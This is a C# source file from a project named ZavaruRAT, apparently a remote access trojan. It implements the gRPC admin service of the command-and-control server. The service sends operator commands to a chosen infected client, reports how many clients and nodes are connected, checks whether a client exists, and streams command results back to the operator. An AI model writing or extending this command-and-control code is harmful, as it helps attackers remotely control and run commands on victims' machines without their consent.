#region

using System.Reactive.Linq;
using Google.Protobuf.WellKnownTypes;
using Grpc.Core;
using ZavaruRAT.Main.Runtime;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Main.Services;

public sealed class AdminService : AdminHub.AdminHubBase
{
    private readonly ClientsStorage _storage;
    private readonly ILogger<AdminService> _logger;

    public AdminService(ClientsStorage storage, ILogger<AdminService> logger)
    {
        _storage = storage;
        _logger = logger;
    }

    public override Task<Empty> InvokeCommand(InvokeCommandRequest request, ServerCallContext context)
    {
        var command = new CommandEvent
        {
            ClientId = request.ClientId,
            HashId = request.HashId,
            Command = request.Command
        };

        _storage.ExecuteCommand(command);

        return Task.FromResult(new Empty());
    }

    public override Task<Statistics> NetworkStatistics(Empty request, ServerCallContext context)
    {
        var stats = new Statistics
        {
            Clients = _storage.Clients.Sum(x => x.Value.Count),
            Nodes = _storage.Clients.Count
        };

        return Task.FromResult(stats);
    }

    public override Task<ClientExistsResponse> ClientExists(ClientExistsRequest request, ServerCallContext context)
    {
        var (nodeId, client) = _storage.GetClient(request.ClientId);

        return Task.FromResult(new ClientExistsResponse
        {
            Exists = client != null
        });
    }

    public override async Task CommandResults(CommandResultsRequest request,
                                              IServerStreamWriter<CommandExecutedEvent> responseStream,
                                              ServerCallContext context)
    {
        _logger.LogInformation("Admin {Admin} subscribed to command executed updates", context.Host);

        try
        {
            var commands = _storage.GetCommandResults().Where(x => x.HashId == request.HashId);

            await foreach (var ev in commands.ToAsyncEnumerable().WithCancellation(context.CancellationToken))
            {
                _logger.LogInformation("Sending command executed event");

                await responseStream.WriteAsync(ev);
            }
        }
        catch (TaskCanceledException)
        {
        }

        _logger.LogInformation("Admin {Admin} unsubscribed from command executed updates", context.Host);
    }
}
